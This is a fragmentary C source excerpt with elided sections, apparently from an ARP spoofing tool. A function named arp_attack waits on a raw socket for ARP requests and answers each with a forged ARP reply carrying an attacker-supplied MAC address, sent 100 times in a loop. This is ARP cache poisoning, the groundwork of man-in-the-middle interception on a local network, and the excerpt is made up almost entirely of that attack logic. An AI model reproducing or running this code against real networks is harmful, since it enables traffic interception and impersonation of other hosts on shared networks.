...
int arp_attack(char * mac,char * broad_mac,char * src_ip,char * dest_ip)
{
	Ether_pkg pkg;
	struct hostent *host =NULL;
...
//	printf("interface Index:%d\n",ifr.ifr_ifindex);
	...
	while(1)
	{
		...
		len=recvfrom ( sockfd,buffer,sizeof ( buffer ),0,NULL,&len );
		if ( ( ntohs ( parse->ether_type ) ==ETHERTYPE_ARP ) &&
		( ntohs ( parse->ar_op ) == ARPOP_REQUEST ) )
		{
			printf("get ARP request\n");
			parse_arp_request (parse);
			make_arp_reply(mac, parse);

			for(i = 0; i < 100; i++)
			{
				len = sendto(sockfd, parse, sizeof (Ether_pkg), 0,(struct sockaddr*)&toaddr,sizeof(toaddr));
				if ( len != sizeof ( pkg ) )
				{
					fprintf ( stderr,"Sendto Error:%s\n\a",strerror ( errno ) );
					return ( 0 );
